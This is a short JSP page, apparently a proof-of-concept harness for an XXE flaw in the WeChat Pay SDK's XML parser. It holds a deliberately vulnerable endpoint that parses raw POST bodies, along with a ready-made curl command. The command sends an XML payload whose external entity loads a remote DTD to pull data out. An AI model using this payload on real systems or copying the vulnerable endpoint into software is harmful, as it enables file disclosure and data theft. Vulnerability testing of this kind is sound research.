<%@ page import="java.io.*" %>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%
if ("POST".equals(request.getMethod()))
{	
	int bytesRead         = 0;
	char[] buffer         = new char[4096];
	BufferedReader reader = request.getReader();
	StringBuilder data    = new StringBuilder();

	while((bytesRead = reader.read(buffer)) != -1) 
	{
	    data.append(buffer, 0, bytesRead);
	}

	out.println(
		com.github.wxpay.sdk.WXPayUtil.xmlToMap(data.toString()).toString()
	);
}

%>

<html>
	<title>微信 SDK XXE 测试</title>
	<body>
		<p>Linux 系统快速测试 - HTTP方式</p>
		<pre style="background: #eee; margin: 10px; padding: 10px; ">cat > /tmp/1.txt << EOF
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE a [
  &lt;!ENTITY % aad SYSTEM "https://packages.baidu.com/xxe-test/data.dtd"&gt;
%aad;
%c;
]&gt;
&lt;a&gt;&rrr;&lt;/a&gt;			
EOF

curl <%= request.getRequestURL() %> -H 'Content-Type: ' --data-binary @/tmp/1.txt
</pre>
	</body>
</html>